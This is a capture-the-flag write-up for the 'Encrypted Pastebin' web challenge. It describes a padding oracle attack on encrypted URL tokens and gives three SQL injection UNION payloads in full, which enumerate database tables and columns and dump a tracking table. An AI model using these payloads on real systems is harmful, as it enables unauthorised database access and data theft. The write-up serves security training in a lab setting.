# Encrypted Pastebin

## Flags

### Flag0

Call `/?post=` with no content in order to generate an error, the response will contain a flag.

`curl http://35.227.24.107/3734c4f860/?post=`

### Flag1

1. Generate a pastebin url through the form
2. Copy the base64 `post` argument (PsRHmyq5eGocq0o0osxRKOoqbgAfPyN!...) 
3. Use the padding oracle attack to decipher the message. Check [python code](./padding_oracle.py)
4. The json formated message contains a flag property

### Flag2

1. Use the padding oracle to send the following json content `{"id": "1"}`.  Check [python code](./padding_oracle.py)
2. The error message is teeling us that the key parameter is missing to decipher the body of the pastebin but it is still printing the title which contains a flag

### Flag3

1. We found a tracking.gif loaded in every page, this might indicate that every page access is generating a database entry. We might be able to find the history of pastebin urls.
2. We will reuse Flag2 method but this time via SQL injection retrive the data from the database:
   1. Get tables: `{"id": "0 UNION SELECT (SELECT group_concat(TABLE_NAME separator ', ') FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN ('performance_schema', 'information_schema', 'mysql')), 'toto' -- "}`
   2. `{"id": "0 UNION SELECT (SELECT group_concat(COLUMN_NAME separator ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'tracking'), 'totot' -- "}`
   3. `{"id": "0 UNION SELECT (SELECT group_concat(headers separator ', ') FROM tracking), 'totot' -- "}`
3. We find an url that correpon to the id=1, the body is containing another flag.

## References

- https://samsclass.info/141/proj/p14pad.htm